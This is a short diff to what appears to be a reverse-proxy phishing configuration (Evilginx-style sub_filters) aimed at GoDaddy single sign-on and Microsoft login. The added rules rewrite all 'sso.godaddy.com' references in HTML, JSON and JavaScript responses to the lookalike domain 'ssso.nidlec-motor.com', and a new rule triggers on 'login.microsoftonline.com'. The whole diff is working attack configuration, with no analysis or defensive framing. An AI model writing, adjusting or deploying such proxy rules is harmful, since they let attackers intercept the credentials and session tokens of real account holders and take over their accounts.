@@ -145,7 +145,8 @@ sub_filters:
   - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "href=\"https://{hostname}", replace: "href=\"https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"] }
   - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"], redirect_only: true }
 # GoDaddy SSO API — rewrite ALL sso.godaddy.com references in responses to use proxy
-  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "sso\\.godaddy\\.com", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"] }
+  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "sso\\.godaddy\\.com", replace: "ssso.nidlec-motor.com", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "sso", domain: "godaddy.com", search: "sso\\.godaddy\\.com", replace: "ssso.nidlec-motor.com", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"] }
   - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"], redirect_only: true }
 # GoDaddy SSO post-auth — rewrite Microsoft hostnames in body and Location header
   - { triggers_on: "sso.godaddy.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"] }
